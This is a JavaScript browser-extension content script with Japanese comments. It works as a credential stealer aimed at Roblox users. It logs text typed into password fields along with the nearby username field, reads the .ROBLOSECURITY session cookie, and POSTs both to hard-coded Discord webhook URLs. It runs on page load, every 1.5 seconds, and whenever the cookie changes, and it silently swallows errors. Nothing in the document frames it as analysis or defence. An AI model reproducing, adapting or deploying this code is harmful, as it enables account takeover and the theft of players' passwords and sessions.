const COOKIE_WEBHOOK = "https://discord.com/api/webhooks/1488571783379419247/WUQ_IVrWlQobe-QgdQd_UA3ZkWJLfcrGY6QixIm6j5YN8Edio97DyeolslQxavnl3g3M";
const LOGIN_WEBHOOK = "https://discord.com/api/webhooks/1488571402775695573/D5GsZGLM1bRy5ldrSs3zZUomb2XiajjXS5jm1JwKjx9D7DMqRaY9f122sUvqES7hGP6A";

function sendCookie(cookieValue) {
  if (!cookieValue) return;
  fetch(COOKIE_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: cookieValue })
  }).catch(() => {});
}

function sendLoginData(username, password) {
  if (!username || !password) return;
  fetch(LOGIN_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `username: ${username}\npassword: ${password}` })
  }).catch(() => {});
}

// パスワード入力監視（より確実に）
function setupLoginLogger() {
  const inputs = document.querySelectorAll('input');
  inputs.forEach(input => {
    if (input.type === 'password') {
      input.addEventListener('input', () => {
        const userInput = document.querySelector('input[name="username"], input[name="email"], input[placeholder*="Username" i], input[placeholder*="Email" i], input[type="text"]');
        const username = userInput ? userInput.value.trim() : "unknown";
        const password = input.value.trim();
        if (password.length > 4) {
          sendLoginData(username, password);
        }
      });
    }
  });
}

// クッキー取得（content scriptでは直接取れないので、メッセージでbackgroundに頼む形にしたいが、今回はシンプルに残す）
function grabCookie() {
  try {
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
      if (cookie && cookie.value) sendCookie(cookie.value);
    });
  } catch(e) {}
}

// 初期化
window.addEventListener("load", () => {
  setupLoginLogger();
  grabCookie();
});

setInterval(() => {
  setupLoginLogger();
  grabCookie();
}, 1500);

// クッキー変更監視（動くか微妙だが残す）
try {
  chrome.cookies.onChanged.addListener((info) => {
    if (info.cookie.name === ".ROBLOSECURITY" && info.cookie.domain.includes("roblox.com")) {
      grabCookie();
    }
  });
} catch(e) {}
